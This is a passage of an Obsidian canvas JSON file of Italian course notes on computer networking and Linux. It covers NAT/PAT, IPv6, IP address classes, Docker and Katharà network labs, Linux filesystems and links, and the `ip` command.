insieme *NAT* e *PAT* è a rigore indicato come ***NAPT***, ma dato che cambiare solamente la porta è una pratica abbastanza inusuale si usa semplicemente **PAT come sinonimo di NAPT.** Poi in pratica la gente è ignorante e usa *NAT* per indicare tutto. Dal momento che questa tecnica permette di nascondere l'`IP_Host` è anche nota come ***IP Masquerading***. Anche qui distinguo\n\n- ***PAT Statico*** - Sostituisce sempre una certa coppia `IP_Host Porta_Host` con la stessa coppia `IP_PAT Porta_PAT` (e.g. `192.168.1.165 8080` -> `200.1.1.1 80`). Questo consente di rendere un ***server*** disponibile dall'esterno sempre sulla stessa coppia `IP Porta`;\n\t- Cambiare la porta permette al server di ascoltare su porte non-standard (e.g. ascolto `HTTP` sulla `Porta_Server = 8080`, ma traduco in `Porta_PAT = 80`. Le richieste client da browser vanno in automatico sulla `Porta 80`, il *PAT* me le reindirizza su `8080`);\n- ***PAT Dinamico*** - Fa la stessa cosa, ma la `Porta_PAT` è scelta in modo casuale tra quelle disponibili. Il comportamento esatto è quello del riquadro a fianco.\n","x":-17398,"y":-1181,"width":790,"height":815,"color":"4"},
		{"id":"48960e7373f05723","type":"text","text":"# Indirizzi IPv6\n\nNon ci sono più IPv4 disponibili? La soluzione non è il NAT, ma creare un nuovo formato di indirizzi a $128\\,bit$. Questo permette di identificare *ogni oggetto* su internet (e.g. una pagina web ha indirizzo fisso). O almeno, questa è la teoria. In pratica IPv6 è lontano dall'adozione globale.\n\nPerò è molto bello, si focalizza sull'essere snello e veloce.\n\n- L'header ha lunghezza fissa, so già dov'è il payload e posso leggerlo in parallelo;\n- Niente checksum (ci pensano i protocolli superiori)\n- Niente frammentazione (se un pacchetto supera l'MTU viene scartato!). Questo richiede di esplorare il percorso con un algoritmo di ***Path MTU Discovery*** (***PMTUD***) che sfrutta ICMP;\n- Prevede un parametro `flow label` per sviluppi futuri (il controllo di flusso secondo etichetta da parte dei router non è ancora implementato su Internet);\n- Implementa bene l'***anycast***, ovvero la consegna a tutti gli host facenti parte di un gruppo;\n- La lunghezza complessiva del datagramma è molto minore rispetto ad IPv4.\n\nil problema è che quasi tutti i router sono ancora IPv4. Per trasmettere un IPv6 devo spesso Incapsularlo come payload dell'IPv4 (***tunneling***).\n\nAttualmente non funziona bene, ma in futuro si può cambiare il concetto di cosa rappresenta un indirizzo: può diventare direttamente un URI di ogni oggetto che metto online (piuttosto che una destinazione!). Ovvero, è un hash che identifica l'oggetto.\n\n\"IPFS (Interplanetary Filesystem), molto carino per applicazioni p2p.\"","x":-17398,"y":-292,"width":790,"height":691,"color":"4"},
		{"id":"9314d10e8c398b40","type":"text","text":"# Network Address Translation (NAT) - Overview\n\nIpotizziamo che il mio ISP mi fornisca un solo indirizzo IP. Sono costretto a poter collegare un solo host alla rete globale? No, assegno questo IP al router e poi sulla mia subnet locale uso gli ***indirizzi privati***. A quel punto sta al router reindirizzare il traffico ai vari host collegati.\n\nPer poter fare questo, il router deve disporre di un software in grado di eseguire la ***Network Address Translation*** (***NAT***). Come funziona?\n\n- Sono un host, e sulla rete locale ho indirizzo privato `192.168.1.165`. Voglio aprire una connessione TCP con il server `100.1.1.1` tra la mia porta `300` e la sua porta `443`. Creo il mio socket e invio il pacchetto al mio router che usa il NAT;\n- Il router non può mandare in rete un pacchetto con indirizzo `192.168.xxx.xxx`, perché è un indirizzo privato.\n\t- Se tutti facessero così, si romperebbe l'univocità degli IP. Esistono $N >> 1$ host che hanno indirizzo `192.168.1.165` sulla LAN, a chi mai dovrebbe essere consegnata la risposta?\n\t- In barba al concetto di *privato*, gli indirizzi IPv4 sono talmente pochi che ormai `192.168.1.165` esiste anche come indirizzo pubblico di rete. \"Del maiale non si butta niente\", diceva nonna IPv4.\n- Ma il router ha almeno un indirizzo IP pubblico assegnatogli dall'ISP (diciamo `200.1.1.1`), quindi può legittimamente mandare il pacchetto a nome suo. Allora sostituisce le informazioni del vero mittente con le proprie. `192.168.1.165 300` diventa `200.1.1.1 31`;\n\t- Perché cambiare anche la porta? Metti che anche `192.168.1.100` vuole aprire una connessione sulla porta `300`. Possono mai diventare entrambi `200.1.1.1 300`? E poi quando arriva la risposta come li distinguo? $\\Rightarrow$ La porta serve a **demultiplexare**;\n\t- Si potrebbe obiettare (e si sa che la gente obietta appena può) che essendo il router un dispositivo di Rete non dovrebbe cambiare gli header di Trasporto. Ma il router non lo sa e la cambia lo stesso;\n\t- Dato che uso la porta per demultiplexare, posso gestire fino a $2^{16}$ connessioni.\n- Le informazioni di demultiplexing (`192.168.1.165 300 31`) vengono salvate in una ***tabella di traduzione NAT***. Il pacchetto parte.\n- Il server si vede arrivare una richiesta TCP da `200.1.1.1 31`. C'è qualcosa di strano? Assolutamente no, perché il NAT è invisibile dall'esterno. Quindi lui tutto contento inizia l'handshaking e invia la prima risposta a `200.1.1.1 31`;\n- Quando al mio router arriva la risposta gli è sufficiente guardare la porta per capire a chi mandare il pacchetto. Sostituisce l'header `200.1.1.1 31` con `192.168.1.165 300` e lo spara al giusto MAC in LAN, come se niente fosse successo.\n\t- In pratica, io host sono convinto che la vera connessione sia tra `192.168.1.165 300` e `100.1.1.1 443`. Inutile dirlo, questa connessione in realtà non esiste.\n\nRiassumendo, quindi, il NAT\n\n- sostituisce l'header di rete dei datagrammi in uscita: `IP_Host Porta_Host` -> `IP_NAT Porta_NAT`;\n- salva la corrispondenza `IP_Host Porta_Host Porta_NAT` nella tabella di traduzione NAT;\n- sostituisce l'header di rete dei datagrammi in ingresso secondo la tabella di traduzione: `IP_NAT Porta_NAT`-> `IP_Host Porta_Host`.","x":-18554,"y":-1181,"width":916,"height":1215,"color":"4"},
		{"id":"08f3eea3d4feef51","type":"text","text":"# Classi D ed E (Multicast e sviluppi futuri)\n\n- Il range di indirizzi da `224.0.0.0/8` a `239.0.0.0/8` è riservato al ***multicast***;\n- Il range di indirizzi da `240.0.0.0/8` a `255.0.0.0/8` è riservato ad eventuali sviluppi futuri. Questi IP possono essere utilizzati nelle reti locali, ma nessun router farà forwarding su pacchetti simili. Ovviamente *riservato* significa che sono in possesso degli USA.","x":-19580,"y":-818,"width":814,"height":187,"color":"4"},
		{"id":"99ef27d883dac209","type":"text","text":"# Classi A, B e C (Indirizzi IP Privati)\n\nPrima dell'avvento di CIDR (1993), gli indirizzi IP erano divisi in classi.\n\n- Classe A - Blocchi di IP destinati ad organizzazioni più grandi, range da `1.0.0.0/8` a `126.0.0.0/8` (si usano i primi 8 bit per identificare la classe A);\n- Classe B - Blocchi di IP più piccoli, identificati dai primi 16 bit. Range da `128.0.0.0/16` a `191.255.0.0/16`;\n- Classe C - Blocchi di IP per reti domestiche o uffici. Range da `192.168.0.0/24` a `223.255.255.0/24`.\n\nFamiliare? Perché da queste classi nascono gli ***indirizzi privati***.\n\n- Classe A - `10.0.0.0/8`;\n- Classe B - `172.16.0.0/12` ($\\Rightarrow$ iniziano con `10101100.0001xxxx`);\n- Classe C - `192.168.0.0/16`\n\nQuando mando un pacchetto entro tali range, questo non viene inoltrato in rete. Segue che lo stesso indirizzo privato può essere riutilizzato in diverse sottoreti, rendendo necessario il ***NAT***.","x":-19580,"y":-459,"width":814,"height":493,"color":"4"},
		{"id":"52fa94b909771d9b","type":"text","text":"# Indirizzi IP Speciali\n\nAlcuni indirizzi IP non identificano un'interfaccia, ma piuttosto dei comportamenti standard.\n\n- `0.0.0.0` è usato quando l'interfaccia non ha ancora un IP associato;\n- Qualsiasi IP che abbia come prefisso di rete tutti `0` si riferisce alla sottorete corrente;\n- `255.255.255.255` è un messaggio ***broadcast*** sulla LAN;\n\t- Qualsiasi IP che abbia come parte host tutti `1` è un messaggio broadcast sulla sottorete specificata nel prefisso di rete (\"Se sono admin di rete, la prima cosa che faccio è proibire i broadcast dall'esterno, sennò chiunque mi può bombardare di dati\");\n- Qualsiasi IP della forma `127.xxx.xxx.xxx` è un indirizzo di ***loopback***. Quando l'host invia un pacchetto con un IP di loopback, questo non esce dal computer ma viene trattato come pacchetto in arrivo;\n- Indirizzi privati.","x":-20560,"y":99,"width":814,"height":420,"color":"4"},
		{"id":"39fe9d808700246c","type":"text","text":"# Il NAPT è un layer di Sicurezza?\n\nIn breve, sì. Passare attraverso (= \"**bucare**\") il NAPT (***NAT Traversal***) non è banale.\n\n- Specificare una porta con una direttiva di ***NAPT Statico*** (anche detto ***Full Cone NAT***) permette di ignorare tutte le altre (e.g. se specifico `192.168.1.1 10` -> `200.1.1.1 30` tutti i pacchetti indirizzati a `200.1.1.1` ma con `porta`$\\neq$ `30` verranno cestinati). In pratica, posso fare *NAT Traversal* solo sapendo quale porta è aperta. Questa *feature* prende il nome di ***port forwarding*** (o ***port mapping***);\n\t- Posso invece passare attraverso il *NAT Statico* con *qualsiasi* `porta`, se conosco l'`IP`;\n- Se uso ***NAPT Dinamico***, stabilire una connessione con un host non è banale perché neanche l'host stesso conosce il suo indirizzo pubblico. A meno che, naturalmente, non sia lui ad aprirla. C'è una giungla di tecniche per provare a \"bucare\" il NAPT (**UDP Hole Punching**, **UPnP**, **MAT-PMP**, ...), che però devono (credo) sempre sfruttare un server di segnalazione (e.g. **STUN**).\n\t- Il NAPT Dinamico è anche detto ***NAPT Simmetrico*** (usa una nuova `Porta_NAT` per ogni combinazione `IP_Host Porta_Host`, anche se `IP_Destinazione` è lo stesso);\n\t- Esiste anche il ***NAPT Asimmetrico***, che usa una `Porta_NAT` per ogni `IP_Host` indipendentemente dalla `Porta_Host` e gestisce fino a $2^{16}$ dispositivi. Utile in applicazioni P2P e giochi. Dato che randomizza meno le porte è un po' più facile da bucare, motivo per cui si usa sempre meno.\n\nIn pratica, il layer di sicurezza dato dal NAPT si riassume così: se l'host dietro NAPT non ha creato una connessione con il computer target, i pacchetti a lui diretti vengono scartati.\n\nLa grossa falla di questo sistema è che il router è l'unico ***failure point***: se un malintenzionato riesce ad entrarci dentro può potenzialmente compromettere la sicurezza di tutti i dispositivi sulla rete locale dietro quel router.\n\nContro questo rischio ci sono due \"argini\":\n\n- Possono esistere più livelli di NAPT annidati. Il singolo router non è più l'unico *point of failure* per tutta la rete, ma solo della sua LAN;\n- Meccanismi di difesa implementati dagli admin di Rete.","x":-17398,"y":-2158,"width":790,"height":848,"color":"#4545ff"},
		{"id":"5e078390c80df780","type":"file","file":"3 - Rete/NAT_Disambigua.png","x":-16378,"y":-1944,"width":780,"height":421},
		{"id":"62d77e93a738633d","type":"text","text":"Ci sono altre $N$ cose da sfruttare per costruire servizi sfruttando l'architettura di rete (?).","x":-16113,"y":939,"width":250,"height":129},
		{"id":"084ffa6fa8076d38","type":"text","text":"# Varie IP\n\nAll'interno della sottorete è previsto che tutti comunichino con tutti\n\nUn singolo dispositivo fisico ha tanti IP quante sono le sue interfacce. I router ne hanno $N$, gli host tipicamente due (Ethernet, Wi-Fi).\n\nnetfilter, VoIP, DMZ. p4.org","x":-19580,"y":-1181,"width":814,"height":229},
		{"id":"5b890feef7056429","type":"file","file":"3 - Rete/ReteMistaIPv4IPv6.png","x":-17398,"y":467,"width":789,"height":232},
		{"id":"a0722c7f81126360","type":"text","text":"# DNS Dinamico\nSvantaggi: se apro un server non ho modo di comunicare il mio IP al mondo. Come si risolve? DNS dinamico.","x":-15360,"y":-926,"width":349,"height":305},
		{"id":"53ab523aeef9ec9a","type":"text","text":"# Premesse su IP (Reti di Elaboratori)","x":-19447,"y":2400,"width":549,"height":191,"color":"6"},
		{"id":"ebf647bc8c1f2c03","type":"file","file":"IPv4.png","x":-8220,"y":6429,"width":759,"height":221},
		{"id":"d54fa96701bb55fe","type":"file","file":"IPv4_Private.png","x":-8220,"y":6738,"width":758,"height":228},
		{"id":"c43c09b5a27c6f80","type":"text","text":"# Katharà\n\nCon Docker, creiamo un `container` per ogni nodo virtuale, dopodiché definiamo una rete di tipo `bridge` personalizzata con cui connettere i vari nodi. Questo crea uno schema di packet switching tra ambienti Docker, che di fatto simula una rete.\n\nAbbiamo sostanzialmente descritto il principio di funzionamento di ***Katharà***.\n\nPartiamo da una cartella in cui siano presenti i file di configurazione\n\n- `lab.conf`, che definisce il ruolo dei vari elementi di rete (e.g. router o pc). Prendendo come esempio `~/pnd-labs/lab1/ex1` abbiamo\n\t- Una breve descrizione dell'attività da svolgere, esplorata meglio nel `file` `README`;\n\t- Una serie di direttive che definiscono il comportamento e la topologia della rete, nella forma `nodo[specifica] = valore`. Abbiamo ad esempio\n\t\t- `r1[0] = 'A'`, i.e. il nodo `r1` è connesso tramite l'interfaccia `0` (che sarebbe `eth0`) alla rete che chiamiamo `A`;\n\t\t- `r1[bridged]=true`. Questo potrebbe far pensare alla rete `bridge` di `docker` (e che quindi questa direttiva stia dicendo che `r1` è connesso agli altri nodi), ma non è così. Questa è una ***modalità bridged*** propria di Katharà, i.e. è come se estendesse il cavo ethernet connettendo anche `r1` alla rete. Da fuori, `r1` viene interpretato come `host` reale connesso sulla stessa interfaccia dell'`host` principale;\n\t\t- `r1[sysctl]=\"net.ipv4.ip_forward=1\"`. Con questa direttiva, Katharà modifica il kernel simulato del nodo `r1` dicendogli di abilitare il `forwarding IPv4`. In pratica, sto dicendo al nodo `r1` di comportarsi da `router IPv4`;\n\t\t- `r1[sysctl]=\"net.ipv6.conf.all.forwarding=1\"`, i.e. l'analogo per `IPv6`;\n\t\t- `pc{1,2,3}[0]=\"A\"`, i.e. l'interfaccia `eth0` dei nodi `pc{1,2,3}` è connessa alla rete `A`. Questa sottorete è quindi composta da tre `pc`.\n- `*.startup`, che definiscono le configurazioni iniziali dei vari elementi di rete, i.e. i comandi eseguiti in `startup` dei nodi (poi mostrati come `log` all'avvio dei terminali).\n\nA questo punto possiamo fare `kathara lstart`, o sfruttiamo l'`alias` `lstart`, se presente. Questo fa partire la simulazione e ci fornisce i terminali per ogni nodo definito in `lab.conf`.\n\nIn modo analogo possiamo riavviare l'ambiente se qualcosa non va (`lrestart`), fermare tutto (`lclean`) o forzare la pulizia dell'ambiente se abbiamo bloccato tutto (`kwipe`).","x":-9320,"y":7440,"width":759,"height":924,"color":"6"},
		{"id":"28ffaf4f75ea584b","type":"text","text":"# Virtual Machines e Containers (Docker)\n\nTutta questa roba gira su una VM, perché simulare un kernel anziché modificare quello della propria macchina è sempre una scelta safe. Tutto questo ci isola completamente dal SO nativo della macchina. Detto questo, all'interno della VM lavoriamo in un ambiente isolato a livello di processi, detto ***container***. In particolare, usiamo ***Docker***.\n\nDocker è un servizio di sistema il cui demone (`dockerd`) parte all'avvio del SO. Il suo scopo è quello di permettere all'utente di creare e gestire i container, ambienti virtuali in cui gruppi di processi vengono isolati dai restanti (a livello tecnico, questo avviene con le funzioni `namespace` e `cgroups` del kernel Linux, ma non ci addentriamo).\n\nDiversi gruppi di processi (i.e. diversi container) hanno in generale diverse necessità di comunicazione. Pertanto, Docker configura di default (prima ancora di creare il primo container!) tre tipologie di reti (visualizzabili con `sudo docker network list`):\n\n- `bridge` - Una rete predisposta a collegare tra di loro i vari container ad essa connessi. Questo non li connette direttamente ad Internet. Funziona in modo simile ad un ***NAPT***, quindi se voglio farli accedere alla rete esterna devo fare ***port mapping***;\n- `host` - Rimuove l'isolamento di rete del container. Questo condivide quindi l'indirizzo `IP` dell'host e usa la sua stessa interfaccia di rete: se apre una porta, lo fa direttamente sul sistema host. Usato per evitare l'overhead di virtualizzazione di rete;\n- `none` - Al container configurato con questa rete è impedita qualsiasi comunicazione, i.e. non ha alcuna interfaccia di rete. Usato generalmente per le sandbox.\n\nSi possono poi creare ulteriori reti personalizzate con `sudo docker network create`.\n\nTutto molto bello, ora però tocca creare un container. Come?\n\nIn pratica, Docker si comporta come se fosse una sorta di server interno al SO. Ha un file ***socket*** (`/var/run/docker.sock`) gestito dal demone `dockerd`: chi vuole creare un nuovo container deve mandare la richiesta al socket, e può farlo solo se sta nel gruppo `docker`, l'unico ad avere i giusti permessi sul socket stesso (oltre ovviamente a `root`).\n\n<span style=\"color:rgb(236, 155, 14)\">**Attenzione:** Chi può scrivere su `/var/run/docker.sock` può **controllare tutto Docker**, il che equivale ad avere accesso **root senza password**.</span>\n","x":-9320,"y":6335,"width":759,"height":870,"color":"4"},
		{"id":"9d6e1bc42fdc8fff","type":"text","text":"# Risultato - `root directory /`\n\nMentre in Windows ogni unità (disco) ha la propria lettera (e.g. `C:\\`), Linux costruisce una ***root directory*** `/` da cui si evolve tutto il contenuto del sistema. Se faccio `ls` vi trovo\n\n- `bin@` - Contiene eseguibili di base per il terminale (e.g. `ls`, `cp`, `cat`);\n\t- Oddio, ma non è una directory! Già non lo è. In principio qui c'era `/bin`, ma versioni più recenti del SW hanno spostato questa cartella in `/usr/bin`. Questo è pertanto un ***symlink*** alla sua versione più recente. E che significa? Posso ancora usare il path `/bin`, il sistema leggerà direttamente gli ***inodes*** di `/usr/bin`;\n\t- Discorso simile per `sbin@`, che contiene gli eseguibili di sistema (e.g. `iptables`);\n- `lib*@` - Ne troviamo diverse versioni, sono librerie di supporto ai vari SW;\n\t- `lib@` contiene quelle per `bin` ed `sbin`;\n\t- `lib32@` e `libx32@` supportano i SW a `32 bit`, `lib64@` quelli a `64 bit`.\n- `boot` - I file di avvio del sistema;\n\t- `vmlinuz` - Di fatto è il ***kernel***. `z` indica una compressione: essendo molto pesante, viene decompresso solo in RAM;\n\t- `initramfs` - All'avvio, il kernel viene caricato in RAM. Per leggere i formati di tipo `filesystem` (e.g. `ext4`) e montare `/` ha però bisogno di altri strumenti, forniti appunto da `initramfs`. Finito questo, il kernel carica il SO da `/sbin/init`.\n- `dev` - `filesystem` virtuale per rappresentare i vari HW collegati;\n- `etc` - Configurazioni di sistema (e.g. `/etc/passwd`, `/etc/hosts` per il DNS locale);\n- `home` - I dati personali degli utenti;\n- `lost+found` - File recuperati dopo un crash. Praticamente inaccessibile;\n- `media` - Punto di mount automatico per HW esterno (e.g. `USB`) ma anche per GUI come `GNOME` e `KDE`. Ci starebbe anche `cdrom`, specifico per i CD, ma ovviamente è in disuso;\n- `mnt` - Punto di mount manuale per `filesystems`;\n- `opt` - SW installato manualmente dall'utente (e.g. Chrome su Ubuntu);\n- `proc` - `filesystem` virtuale contenente informazioni sul sistema (e.g. `/proc/cpuinfo`);\n- `root` - `Home directory` per l'utente `root`;\n- `run` - Dati temporanei di `runtime` (e.g. `PID`, `Socket`);\n- `snap` - SW installato con `snap`;\n- `srv` - Qui dentro c'è qualcosa solo se la macchina offre servizi da server;\n- `swapfile` - Memoria virtuale;\n- `sys` - `filesystem` virtuale per le informazioni sull'HW;\n- `usr` - Programmi installati dal sistema (e.g. SW e librerie non essenziali);\n- `var` - Dati variabili (e.g. `log`, pool di stampa);\n- `tmp` - Dati temporanei, azzerati al riavvio del sistema.","x":4838,"y":-3451,"width":759,"height":1021,"color":"4"},
		{"id":"9353a581758bae87","type":"text","text":"# Hard and Soft (... links)\n\nAbbiamo capito che in Linux ogni file corrisponde ad un `inode`, che contiene informazioni su permessi, proprietari, timestamp e puntatori ai blocchi di dati di memoria. Nota che un `inode` non contiene il nome del file: diversi nomi possono puntare allo stesso `inode`.\n\n- Un ***hard link*** genera un ***alias*** che punta allo stesso `inode`. Posso crearne uno con il comando `ln originale.txt copia.txt`, ed entrambi avranno lo stesso numero di `inode`. Questo significa che anche eseguendo `rm originale.txt` l'`inode` resta raggiungibile da `copia.txt`;\n\t- Questa cosa si può fare solo entro lo stesso `filesystem`. Il motivo è chiaro: ogni `filesystem` ha il suo set di `inodes`, che sono univoci solo entro quel `filesystem` stesso. L'`inode 10` di `/etc` e l'`inode 10` di `/proc` puntano a cose diverse! );\n\t- La memoria viene liberata solo quando tutti gli hard link a quell'`inode` vengono rimossi. `find / -inum 123456` trova tutti i file che puntano all'`inode 123456`;\n\t- Usato per creare ***più punti di accesso ad un file*** senza duplicarlo, mantenendo ogni link funzionante anche se un altro viene rinominato o spostato.\n- Un ***soft link*** (***symlink***) genera un link al ***path*** di un altro file. Posso crearne uno con il comando `ln -l /originale.txt /home/user/desktop/symlink.txt`. Il file su `desktop` farà riferimento al `path /originale.txt`, e da lì troverà il giusto `inode`.\n\t- `symlink.txt` non ha lo stesso `inode` di `originale.txt`. Questo permette ad un `soft link` di creare collegamenti tra `filesystems` diversi;\n\t- Se il file `originale.txt` viene eliminato, `symlink.txt` diventa un ***dangling link***, i.e. un ***link rotto***. Posso trovare tutti i link rotti nel sistema con `find / -xtype l`;\n\t- Usato per creare ***shortcut*** ed organizzare le cartelle in modo dinamico.","x":4838,"y":-2243,"width":759,"height":760,"color":"4"},
		{"id":"2e45d1f9862fc4b4","type":"text","text":"\n## **💣 6. Montaggio e Manipolazione del Filesystem**\n\n### **🛠 Montare un Filesystem**\n\nPuoi montare manualmente una partizione per esplorare i suoi file.\n\n```bash\nmount /dev/sdb1 /mnt\ncd /mnt\n```\n\nPer smontare:\n\n```bash\numount /mnt\n```\n\n💡 **Hacker Tip:**\n\n- Se trovi un disco sospetto, puoi montarlo e analizzarne il contenuto.\n- `mount -o loop file.iso /mnt` → Monta un file `.iso` come fosse una partizione.","x":2820,"y":-2940,"width":759,"height":510},
		{"id":"1e4bdb54f9ff41bb","type":"text","text":"# Montare un `filesystem`\n\nMa come fa il SO a montare un `filesystem`? C'è una `syscall` apposta: `mount()`. E che fa?\n\nPrendiamo questo esempio: quando inserisco una `USB`, il kernel ha un modulo che se ne accorge, legge i metadati e se si tratta di un `filesystem` leggibile lo mette in `/dev/sd*` (e.g. `/dev/sda`, che è l'intero file a blocchi, mentre i vari `sda1`, `sda2` sono le singole partizioni). Questo chiaramente non è un punto di accesso ai dati, ma solo un `hey, qui c'è una roba`. Per leggerlo devo capire come interpretarlo, i.e. leggere il `superblock`. Il comando `sudo mount /dev/sda1 /mnt/usb` fa esattamente questo, aggiungendo l'`inode /mnt/usb` come punto di accesso. È quindi in grado di mappare gli `inodes` fisici in `inodes` virtuali, creando contestualmente un numero univoco di `Device`.\n\nOvviamente tutto questo vale anche nel caso in cui sia il SO stesso a creare un `filesystem` virtuale, con l'eccezione che non va mappato nulla (piuttosto, va solo aggiunto un accesso).\n\nPosso visualizzare l'elenco dei `filesystem` montati con `mount | column -t` (o `findmnt`, che fa l'albero). Sarà facile notare che la stragrande maggioranza di essi sono virtuali (quelli fisici hanno spesso `SOURCE /dev/qualcosa`), che ci stanno un botto di tipi di formattazione (`FSTYPE`) e che i punti di mount sono anche altrove (non solo in `/`!).\n\nViceversa, la \"rimozione sicura dell'HW\" fa un `unmount`, i.e. scollega il `filesystem` in modo \"dolce\" per evitare che il SO esegua ancora operazioni mentre rimuovo la chiavetta fisica.","x":2820,"y":-2243,"width":759,"height":759,"color":"4"},
		{"id":"725abded725d4498","type":"text","text":"# Dischi Fisici e Partizioni - `df`, `lsblk`, `blkid`\n\nGli `inodes` non corrispondono allo spazio su disco. Un file è associato sempre ad un solo `inode`, indipendentemente dal suo peso (può essere `50 byte` come `10 Gb`).\n\n- Il comando `df` (`disk free`) mostra lo spazio su disco e gli `inodes` per i soli `filesystems` fisici, includendo il loro punto di montaggio. Come opzioni principali abbiamo `-h` (human-readable), `-i` (mostra gli `inodes` invece dello spazio) e `-T` (mostra la formattazione, e.g. `ext4`);\n- `lsblk` mostra tutti i `filesystems` riconosciuti dal SO, anche quelli non montati (per vedere solo quelli montati, `findmnt`);\n- `blkid` restituisce le informazioni su disco e partizione su cui ti trovi.","x":3829,"y":-2772,"width":759,"height":342,"color":"4"},
		{"id":"db8524057030a7aa","type":"text","text":"# Linux `filesystem`\n\nPartiamo col dire questo: un SO può tranquillamente ***simulare*** un `filesystem`. Perché mai dovrebbe volerlo fare? In realtà è semplice. Il fatto stesso che il SO sia in esecuzione implica che ci sono dei processi che stanno girando. Quali? Basta andare su `/proc`, no? \n\nBene, `/proc` è un `filesystem` simulato. Questo perché i processi nascono all'avvio del SO, non avrebbe molto senso scrivere su disco una cosa che va continuamente cancellata ad ogni riavvio del sistema. La soluzione quindi è lasciarli solo su RAM, ma è utile sapere quale processo ha generato quale. L'albero dei processi è un `filesystem`... virtuale. Nonostante non sia questo che avviene, avrebbe senso far coincidere gli `inodes` di questo albero con i `PID` dei vari processi, dove giustamente il processo con `PID 1` corrisponde all'`inode 1`.\n\nA rigore ci sarebbe da dire che gli `inodes` sono una mappatura dei dati su disco, e sono propri dei `filesystems` fisici. Un `filesystem` simulato non avrebbe bisogno di `inodes`, ma il SO li genera lo stesso per uniformità e compatibilità. La differenza però la si può vedere eseguendo prima `findmnt` (mostra tutti i `filesystems` montati), e poi `df -i` (mostra solo gli `inodes` realmente esistenti, perché legge i dischi fisici).\n\nOra, capiamo bene che se `/proc` è un `filesystem` a sé stante (`procfs`) con un proprio `inode 1`... ma `/proc` è solo una delle `directories` di `/`... Qual è il punto?\n\n***Linux crea il proprio `filesystem` complessivo montando diversi `filesystems`***, sia fisici che virtuali. Questo significa anche però che ognuno di essi avrà i propri `inodes`, e in particolare ognuno di essi avrà il proprio `inode 1` da cui parte tutto. È per questo che facendo `l -i /` troviamo diversi oggetti con `inode 1`. Come fa il SO a distinguerli? \n\nEseguendo `stat /sys` notiamo una voce `Device = 17h/23d` (formato `hex/decimale`), mentre con `stat /proc` troviamo `Device = 18h/24d`, nonostante abbiano entrambi `inode = 1`. In pratica, assegnando numeri di `Device` univoci ad ogni `filesystem` che monta, la nuova \"chiave primaria\" per identificare gli elementi nel sistema diventa `(Device, inode)`.\n","x":3829,"y":-2242,"width":759,"height":759,"color":"6"},
		{"id":"3211cceb0b4760d0","type":"text","text":"# SPACING","x":7200,"y":1600,"width":250,"height":235,"color":"5"},
		{"id":"6033fbd5014b0cba","type":"text","text":"# PND 27/02\n\n6o67wtg\n\nACME è una rete virtuale in ambiente sapienza sulla quale implementare le cose del corso (sulla quale girano circa 15 VM). Usa una VM con Katharà, NON fare sta roba sul pc direttamente perché esplode tutto\n\ncompleteness\ncorrectness\neffort (scrivi più di 1-2 pagine nel report, che sennò si incazza)","x":-9320,"y":3880,"width":759,"height":360},
		{"id":"e5fc1848775e11e1","type":"text","text":"## continua lec 1\n\n- find - looks for files (by name, size, ...)\n- la shell ha comandi interni ad essa ed esterni. con `which ls` trovi il percorso dei comandi esterni (se è interno non restituisce niente). `ls` è esterno\n- `man comando` restituisce il manuale di `comando`.\n- `apropos comando` ti dice cosa fa `comando`\n- `info comando` è la vecchia versione di `man comando`, ma su editor (man è su terminale)\n- `alias` restituisce tutte le shortcut alternative per i comandi\n\t- `ll` è `ls -afD`, se fai `ll /proc/` ti escono cose che non sono né `d` (directory) né `-` (file), ma `c` (??) o `s` (file compresso??) \n- cosa sono i gruppi `shadow` e `dialout` ???\n- s al posto di x = prima dell'esecuzione cambia la proprietà del file. `which passwd` e poi `ll /output/passwd` (vedrò la `s` sull'user, quando lo esegue il possesso passa a root). Vedi rec\n\t- mi sa che devi chiedergli cosa recuperare... SO2?\n\n`shadow` sono le password pare, e sono separate dal file `passwd`!!\nQuella NON è una RegEx!! è una EXPANSION del bash\n\n`for i in 'la -1 *a.txt'; do echo $i.backup; done`\n\nfa un backup di ....... guarda la rec. link simbolici con `ln`. \n\nanche per una parte sui permessi, è circa l'una e mezza \n\n`cat` = concatenate (cerca le motivazioni dietro ai comandi!!!)\n\n`echo '3 is a number' | wc -w | tr '[0-9]' '[n-z]'` che fa sta roba?\n\n- echo manda in output la frase\n- la prende word count (wc) con opzione -w (conta sola le parole), quindi restituisce 4\n- tr.....\n\n128 è 10000000....","x":-9320,"y":4320,"width":759,"height":858},
		{"id":"339d53393538d01d","type":"text","text":"# Varie\n\nCambiare il font dei terminali:\n\n- `nano ~/.Xresources` e aggiungi\n\t- `xterm*faceName: Monospace`\n\t- `xterm*faceSize: 12`\n\t- `/home/user/.Xresources (END)`\n- Salva, poi su terminale `xrdb -merge ~/.Xresources`.\n\n\nslide 11 - nel file di configurazione sono tutti là (ip, netmask, ...)\n- ifconfig ipmask e mask, route for default gateway, e ??.conf (REC!!)\n\n\n\nvedi `nmcli` `netclang`?\n\nper riprendere l'esecuzione di un processo stoppato (CTRL+Z): `fg`","x":-6854,"y":7280,"width":759,"height":924},
		{"id":"e214ed120d45c08a","type":"text","text":"# Comando `ip` (= `ifconfig`+`route`+`arp`)\n\nParte del pacchetto `iproute2`, il comando `ip` offre, similmente ai comandi `git` e `apt`, diverse sottoclassi di comandi. In questo modo unifica molti comandi precedenti.\n\n```\nip [sub-command] [target/options]\n```\n\n- Il sub-command `link` gestisce le ***interfacce di rete***;\n\t- `ip link show` mostra tutte le interfacce con relativo stato;\n\t- `ip link set eth0 {up, down}` - {Attiva, Disattiva} l'interfaccia `eth0`;\n\t- `ip link set eth0 address [MAC]` - Cambia l'indirizzo `MAC` di `eth0` (serve `root`).\n- `address` (alias `addr`) gestisce gli ***indirizzi IP***;\n\t- `ip addr show` - Mostra gli `IP` associati a tutte le interfacce di rete;\n\t\t- Posso anche specificarne una sola aggiungendo `dev eth0`.\n\t- `ip addr {add, del} 192.168.100.25/24 dev eth0` - {Aggiunge, Rimuove} un indirizzo `IP` con relativa maschera di sottorete all'interfaccia `eth0`;\n\t\t- Posso aggiungere la specifica `broadcast 192.168.100.31`.\n\t- `ip addr flush dev eth0` - Rimuove tutti gli `IP` associati a `eth0`.\n- `route` - Come il vecchio comando `route`, gestisce le ***routing tables***;\n\t- `ip route {add, del} 10.0.0.0/24 via 192.168.100.30` - {Aggiunge, Rimuove} la regola di routing \"`Se la destinazione è 10.x.x.x, invia il pacchetto a 192.168.100.30`\";\n\t- `ip route add default via 192.168.1.1` - Definisce `192.168.1.1` come ***default gateway*** (`ip route del default` lo rimuove);\n\t- `ip route flush` - Cancella l'intera tabella di routing.\n- `neigh` - Gestisce le ***tabelle ARP***.\n\t- `ip neigh {show, flush} dev eth0` - {Mostra, Cancella} la cache 